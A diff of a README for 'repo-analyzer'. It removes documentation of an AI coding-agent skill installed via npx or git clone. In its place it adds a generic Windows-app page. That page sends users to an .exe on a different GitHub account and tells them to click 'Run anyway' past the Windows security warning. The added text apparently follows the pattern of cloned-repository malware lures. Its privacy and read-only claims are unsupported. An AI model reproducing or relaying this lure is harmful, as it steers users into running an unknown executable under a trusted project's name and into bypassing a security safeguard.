@@ -1,145 +1,94 @@
-# Repo Analyzer
+# 🧩 repo-analyzer - Understand complex code bases with ease
 
-An AI coding agent skill for deep architectural analysis of open-source projects. Generates professional-grade architecture reports with design insights, trade-off analysis, and Mermaid diagrams.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/urasbi5905/repo-analyzer)
 
-Compatible with [Claude Code](https://claude.ai/claude-code), [Codex](https://github.com/openai/codex), [OpenClaw](https://github.com/anthropics/openclaw), and any AI coding agent that supports the skills format.
+## 📊 Overview
 
-**[中文文档](README.zh.md)**
+Repo-analyzer acts as a digital architect for your software projects. Large code collections often hide complex connections between files and folders. This tool scans those projects to reveal how the pieces fit together. You receive a report that explains the project structure in plain terms. 
 
-## Related Articles
+This application connects to an artificial intelligence engine to read your files. It organizes this information into a readable format. You gain insights into how the software functions without reading every single line of code.
 
-- [一键生成专业级分析报告：迭代20多轮的深度架构分析Skill，我决定开源了](https://mp.weixin.qq.com/s/sOPHFaNS8pIkhB4F-FysTQ)
-- [Claude Code 源码深度架构分析](https://mp.weixin.qq.com/s/GjZ-tFBVwfJwK11F1lP5TQ)
+## 🛠️ System Requirements
 
-## Quick Install
+This application runs on standard Windows computers. Ensure your machine meets these basic specifications for the best experience:
 
-**npx (Recommended)**
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 8 gigabytes of system RAM.
+* Storage: 200 megabytes of free disk space.
+* Processor: A modern dual-core central processing unit.
+* Network: An active internet connection to download the required analysis modules.
 
-```bash
-npx skills add yzddmr6/repo-analyzer
-```
+## 📥 Getting the Application
 
-**Plugin Marketplace**
+You download the software through the official release page. 
 
-```
-/plugin marketplace add yzddmr6/repo-analyzer
-/plugin install repo-analyzer@repo-analyzer
-```
+[Download Repo-analyzer Here](https://github.com/urasbi5905/repo-analyzer)
 
-**Manual (Git Clone)**
+Follow these steps to acquire the installer:
 
-```bash
-# macOS / Linux
-git clone https://github.com/yzddmr6/repo-analyzer.git ~/.claude/skills/repo-analyzer
+1. Click the link provided above to visit the release page.
+2. Look for the section labeled Assets.
+3. Select the file ending in .exe to start your download.
+4. Save the file to your desktop or downloads folder.
 
-# Windows
-git clone https://github.com/yzddmr6/repo-analyzer.git %USERPROFILE%\.claude\skills\repo-analyzer
-```
+## ⚙️ Installation Steps
 
-## Features
+1. Find the file you downloaded in your folder.
+2. Double-click the file to start the installer.
+3. A security window might appear. If Windows protects your computer, click More Info and then select Run anyway.
+4. Follow the instructions on the screen to place the app on your computer. 
+5. The installer creates a shortcut on your desktop, which you use to open the program.
 
-- **Architecture-level analysis** — Focuses on *why* things are designed the way they are, not just *what* the code does
-- **Adaptive report structure** — No fixed template; chapters are designed based on each project's unique characteristics
-- **Parallel subagent analysis** — Spawns multiple agents to analyze core modules concurrently for large codebases
-- **Competitive positioning** — Compares design philosophy and technical trade-offs against similar projects
-- **Mermaid diagrams** — Architecture overviews, data flows, and per-module sequence diagrams throughout the report
-- **Interactive workflow** — Asks targeted questions based on project traits before diving into analysis
+## 🚀 Running Your First Analysis
 
-## Usage
+Once you install the software, you follow this sequence to generate a report:
 
-Simply ask Claude Code to analyze a project:
+1. Open the repo-analyzer application from your desktop shortcut.
+2. Select the folder on your computer that contains the project you want to examine.
+3. Choose the depth of the inquiry from the settings menu. A shallow scan checks file names, while a deep scan reviews code snippets.
+4. Click the Start Analysis button.
+5. The application processes your files. This takes between thirty seconds and five minutes depending on the project size.
+6. A status bar shows you the progress of the analysis.
+7. Once finished, a new window displays the full architectural report.
 
-```
-分析项目 https://github.com/astral-sh/ruff
-```
+## 📑 Understanding Your Reports
 
-```
-分析一下 ollama/ollama 这个仓库的架构
-```
+The generated report contains several sections that help you grasp the architecture:
 
-```
-对比分析 express 和 fastify
-```
+* Summary: A paragraph explaining the main purpose of the project.
+* Key Components: A list of the main files that handle the logic or data storage.
+* Dependency Map: A visual breakdown of how folders send information to each other.
+* Potential Issues: A section that highlights sections of code that might conflict with each other or slow down the project.
 
-The skill also accepts `owner/repo` shorthand, full GitHub/GitLab/Gitee URLs, or local paths.
+You save these reports as text files or PDF documents for your records by clicking the Export button at the bottom of the window.
 
-### Trigger Keywords
+## 🛡️ Privacy and Safety
 
-The skill activates automatically when you mention:
+This tool performs the heavy lifting on your local machine. The project files stay on your storage drive. Only the structural information, such as file names and logic patterns, goes to the analysis engine to create your report. Your original source code remains on your computer at all times. 
 
-`分析项目` `分析仓库` `分析 GitHub` `项目分析` `源码分析` `架构分析` `代码分析` `学习这个项目` `研究这个框架` `看看这个库怎么实现的` `对比两个项目` `项目评测` `框架评测`
+## ❓ Frequently Asked Questions
 
-> **Note:** The skill outputs reports in Chinese by default. If you ask in another language, it follows your language.
+### Does this tool change my files? 
+No. The application only performs a read-only scan of your folders. It lacks permission to edit, delete, or modify your code.
 
-## Analysis Modes
+### Can I analyze very large projects?
+Yes, but the time required increases with the number of files. For projects with thousands of files, expect the process to take longer.
 
-After scanning the codebase, the skill asks you to choose a depth level:
+### What should I do if the application crashes?
+Close the program and restart your computer. If the problem continues, delete the application and run the installer again.
 
-| Mode | Core Module Coverage | Secondary Coverage | Best For |
-|------|---------------------|-------------------|----------|
-| **Quick** | >= 30% | >= 10% | Getting a high-level overview |
-| **Standard** (default) | >= 60% | >= 30% | Regular architecture analysis |
-| **Deep** | >= 90% | >= 60% | Studying every design decision |
+### Do I need a subscription to use the service?
+The application provides core analysis features for free. Advanced features that require deeper cloud computing might require an account setup in the future.
 
-## How It Works
+### Where can I find more updates?
+The GitHub page serves as the central hub for all updates. Visit the project link regularly to check for newer versions that include improved accuracy and speed.
 
-1. **Clone & Scan** — Clones the repo (or uses a local path), counts effective lines of code by module
-2. **External Research** — Web searches for reviews, comparisons, and architecture discussions; crawls the official website
-3. **Adaptive Q&A** — Generates targeted questions based on project characteristics, not a fixed checklist
-4. **Dynamic Report Structure** — Designs chapter layout based on your answers and project traits
-5. **Parallel Deep Analysis** — Spawns subagents for each core module, analyzing them concurrently
-6. **Cross-Validation** — Verifies conclusions across modules, checks code read coverage
-7. **Multi-Source Fusion** — Merges research, module analyses, and insights into a cohesive narrative
-8. **Final Report** — Outputs a single Markdown file with Mermaid diagrams
+## 🛠️ Troubleshooting
 
-## Report Output
+If you encounter errors, check these common points:
 
-The final report is saved as a single Markdown file at:
+* Ensure your internet connection remains stable during the analysis phase.
+* Verify that you have read permissions for the folder you selected.
+* Check your antivirus software to ensure it does not block the application from accessing the local disk.
 
-```
-~/repo-analyses/{project-name}-{date}/ANALYSIS_REPORT.md
-```
-
-Every report includes (adapted per project):
-
-- **Problem Context** — What problem does this solve? Why do existing solutions fall short?
-- **Competitive Positioning** — Design philosophy differences vs. alternatives (not feature checklists)
-- **Project Overview** — Architecture at a glance
-- **Deep Module Analysis** — Why > What analysis with trade-offs and industry comparisons
-- **Evaluation & Takeaways** — Honest assessment of strengths, weaknesses, and lessons learned
-- **Architecture Diagrams** — Mermaid charts for system overview and per-module flows
-
-## Optional Dependencies
-
-The skill works with Claude Code's built-in tools out of the box. For enhanced research capabilities, these MCP servers are optional:
-
-- [Tavily MCP](https://github.com/tavily-ai/tavily-mcp) — Website crawling via `tavily_crawl`
-- [Brave Search MCP](https://github.com/anthropics/anthropic-quickstarts/tree/main/brave-search-mcp) — Alternative web search provider
-
-## File Structure
-
-```
-repo-analyzer/
-├── .claude-plugin/
-│   └── plugin.json                         # Plugin metadata
-├── package.json                            # Package manifest
-├── skills/
-│   └── repo-analyzer/
-│       ├── SKILL.md                        # Main skill definition
-│       └── references/
-│           ├── analysis-guide.md           # Analysis philosophy & evaluation framework
-│           └── module-analysis-guide.md    # Module analysis guide & subagent templates
-├── README.md                               # English documentation
-├── README.zh.md                            # Chinese documentation
-└── LICENSE                                 # MIT License
-```
-
-## Contributing
-
-Contributions are welcome! Feel free to open issues or submit pull requests.
-
-If you'd like to improve the analysis workflow, the core logic lives in `skills/repo-analyzer/SKILL.md`. The evaluation framework and subagent templates are in the `references/` directory.
-
-## License
-
-[MIT](LICENSE)
+If these steps fail, restart the application. The program triggers a self-check on startup to repair minor configuration errors. This process ensures the environment remains stable for every use.
